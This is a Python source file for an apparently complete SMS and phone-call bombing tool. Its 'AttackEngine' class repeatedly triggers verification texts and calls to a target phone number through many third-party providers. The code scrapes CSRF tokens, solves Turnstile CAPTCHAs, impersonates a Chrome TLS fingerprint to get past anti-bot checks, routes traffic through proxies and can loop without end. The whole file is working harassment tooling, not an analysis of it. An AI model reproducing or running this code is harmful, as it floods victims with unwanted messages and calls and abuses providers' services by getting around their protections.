import time
import random
import asyncio
from typing import List, Callable, Optional, Dict, Any

try:
    from curl_cffi.requests import AsyncSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False
    import httpx

import re
from core.phone import PhoneNumber
from core.provider import Provider
from core.proxy import ProxyManager
from core.captcha import CaptchaSolverBridge

class EngineStats:
    def __init__(self):
        self.start_time: float = time.time()
        self.total_sent: int = 0
        self.success: int = 0
        self.failed: int = 0
        self.call_success: int = 0
        self.call_failed: int = 0
        self.sms_success: int = 0
        self.sms_failed: int = 0

    @property
    def elapsed(self) -> float:
        return max(0.001, time.time() - self.start_time)

    @property
    def req_per_sec(self) -> float:
        return self.total_sent / self.elapsed


class AttackEngine:
    def __init__(
        self,
        providers: List[Provider],
        phone: PhoneNumber,
        mode: str = "all", # "all", "call", "sms"
        max_concurrency: int = 5,
        proxy_manager: Optional[ProxyManager] = None,
        on_result: Optional[Callable[[Provider, bool, int, float, Optional[str]], None]] = None,
        use_stealth: bool = True
    ):
        self.all_providers = providers
        self.phone = phone
        self.mode = mode.lower()
        self.max_concurrency = max_concurrency
        self.proxy_manager = proxy_manager
        self.on_result = on_result
        self.use_stealth = use_stealth and HAS_CURL_CFFI
        self.engine_name = "curl_cffi (Chrome124 Stealth)" if self.use_stealth else "httpx (Standard OpenSSL)"
        self.captcha_bridge = CaptchaSolverBridge()

        # Filter providers by mode
        if self.mode == "call":
            self.providers = [p for p in self.all_providers if p.type == "call"]
        elif self.mode == "sms":
            self.providers = [p for p in self.all_providers if p.type == "sms"]
        else:
            self.providers = list(self.all_providers)

        self.stats = EngineStats()
        self.results: List[Dict[str, Any]] = []
        self.is_running = False
        self._semaphore: Optional[asyncio.Semaphore] = None

    async def _send_one(self, session, provider: Provider):
        if not self.is_running:
            return

        provider.mark_used()
        start_t = time.perf_counter()
        success = False
        status_code = 0
        error_msg = None

        try:
            extra_vars = {}

            # Layer 4: Session Preflight & Cookie/CSRF Flow
            if provider.preflight_url:
                try:
                    pre_resp = await session.get(provider.preflight_url, timeout=provider.timeout)
                    match = re.search(
                        r'name=["\'](?:csrf_token|_token|authenticity_token)["\']\s+value=["\']([^"\']+)["\']',
                        pre_resp.text,
                        re.IGNORECASE
                    )
                    if match:
                        extra_vars["csrf_token"] = match.group(1)
                except Exception:
                    pass

            # Layer 3: CAPTCHA / Turnstile token resolution bridge
            if provider.captcha_sitekey:
                page_url = provider.captcha_page_url or provider.url_template
                token = await self.captcha_bridge.solve_turnstile(page_url, provider.captcha_sitekey)
                if token:
                    extra_vars["captcha_token"] = token
                    extra_vars["turnstile_token"] = token

            # Layer 5 fix: build_request inside try block with injected tokens
            req_args = provider.build_request(self.phone, extra_vars=extra_vars)
            method = req_args.pop("method")
            url = req_args.pop("url")
            
            # Minimal micro-jitter to prevent static lockstep
            await asyncio.sleep(random.uniform(0.005, 0.02))

            resp = await session.request(method, url, **req_args)
            status_code = resp.status_code
            latency = (time.perf_counter() - start_t) * 1000.0
            
            provider.handle_response_code(status_code)

            if provider.is_success(status_code, resp.text):
                success = True
            else:
                if status_code in (200, 201):
                    error_msg = "Body Rejected (Anti-Bot / Challenge / Error)"
                else:
                    error_msg = f"HTTP {status_code}"

        except asyncio.TimeoutError:
            latency = (time.perf_counter() - start_t) * 1000.0
            error_msg = "Timeout"
        except Exception as e:
            latency = (time.perf_counter() - start_t) * 1000.0
            error_msg = type(e).__name__

        # Update stats
        self.stats.total_sent += 1
        if success:
            self.stats.success += 1
            if provider.type == "call":
                self.stats.call_success += 1
            else:
                self.stats.sms_success += 1
        else:
            self.stats.failed += 1
            if provider.type == "call":
                self.stats.call_failed += 1
            else:
                self.stats.sms_failed += 1

        self.results.append({
            "name": provider.name,
            "type": provider.type,
            "ok": success,
            "status": status_code,
            "err": error_msg,
            "ms": round(latency, 1),
        })

        if self.on_result:
            try:
                self.on_result(provider, success, status_code, latency, error_msg)
            except Exception:
                pass

    async def run(self, rounds: int = 1, delay_between_rounds: float = 1.0):
        if not self.providers:
            raise ValueError(f"No providers available for mode: {self.mode}")

        self.is_running = True
        self.stats = EngineStats()
        self.results = []
        self._semaphore = asyncio.Semaphore(self.max_concurrency)

        proxy_url = self.proxy_manager.get_proxy() if self.proxy_manager and self.proxy_manager.has_proxies else None

        if self.use_stealth:
            session_context = AsyncSession(
                impersonate="chrome124",
                proxy=proxy_url,
                verify=False
            )
        else:
            import httpx
            limits = httpx.Limits(max_keepalive_connections=20, max_connections=50)
            session_context = httpx.AsyncClient(proxy=proxy_url, limits=limits, verify=False)

        async with session_context as session:
            current_round = 0
            while self.is_running and (rounds <= 0 or current_round < rounds):
                current_round += 1
                
                tasks = []
                for provider in self.providers:
                    if not self.is_running:
                        break
                    
                    wait_s = max(0.0, provider.cooldown - (time.time() - provider.last_used)) if current_round > 1 else 0.0

                    async def task_wrapper(p=provider, delay=wait_s):
                        if delay > 0:
                            await asyncio.sleep(delay)
                        async with self._semaphore:
                            await self._send_one(session, p)

                    tasks.append(asyncio.create_task(task_wrapper()))

                if tasks:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    # Inspect any task that threw unhandled exceptions
                    for res in results:
                        if isinstance(res, Exception):
                            self.stats.total_sent += 1
                            self.stats.failed += 1
                            print(f"[!] worker error: {type(res).__name__}: {res}", flush=True)

                if self.is_running and (rounds <= 0 or current_round < rounds):
                    if delay_between_rounds > 0:
                        await asyncio.sleep(delay_between_rounds)

        self.is_running = False

    def stop(self):
        self.is_running = False
